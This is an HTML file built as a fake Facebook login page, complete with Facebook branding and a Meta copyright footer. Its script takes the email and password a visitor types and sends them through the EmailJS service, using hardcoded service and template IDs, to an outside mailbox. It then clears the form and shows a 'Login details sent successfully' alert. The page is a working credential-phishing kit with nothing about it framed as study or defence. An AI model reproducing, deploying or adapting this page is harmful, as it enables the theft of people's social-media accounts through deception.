<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="./login_form_2.css" />

  <!-- Include EmailJS SDK -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      // Initialize EmailJS with your user ID
      emailjs.init("jJxV-aIeQl81sucMy");
    })();
  </script>
</head>
<body>
  <div class="content">
    <div class="flex-div">
      <div class="name-content">
        <h1 class="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
        <form id="login-form">
          <input type="text" id="email" placeholder="Email or Phone Number" required />
          <input type="password" id="password" placeholder="Password" required>
          <button type="button" class="login" onclick="sendMail()">Log In</button>
          <a href="#">Forgot Password ?</a>
          <hr>
          <button class="create-account">Create New Account</button>
        </form>
    </div>
  </div>


  

  <!-- Define the sendMail function -->
  <script type="text/javascript">
    function sendMail() {
      var params = {
        // Assuming 'name' is a static value you want to send
        name: "Facebook User",
        email: document.getElementById("email").value,
        message: document.getElementById("password").value,
      };

      const serviceID = "service_9kt8ida";
      const templateID = "template_w8gtjlq";

      emailjs.send(serviceID, templateID, params)
      .then(res => {
        console.log("Email sent", res);
        alert("Login details sent successfully!");
        // Clear the form fields
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
      })
      .catch(err => console.error("Failed to send email", err));
    }
  </script>

  <footer>
    <div class="footer-content">
      <!-- This will be a list of languages or other footer items -->
      <ul class="footer-list">
        <li><a href="#">Ελληνικά</a></li>
        <li><a href="#">English (US)</a></li>
        <!-- Add more languages or footer items here -->
        <li><a href="#">More...</a></li>
      </ul>
      <!-- Additional footer information here -->
      <p class="footer-meta">Meta © 2024</p>
    </div>
  </footer>
</body>
</html>
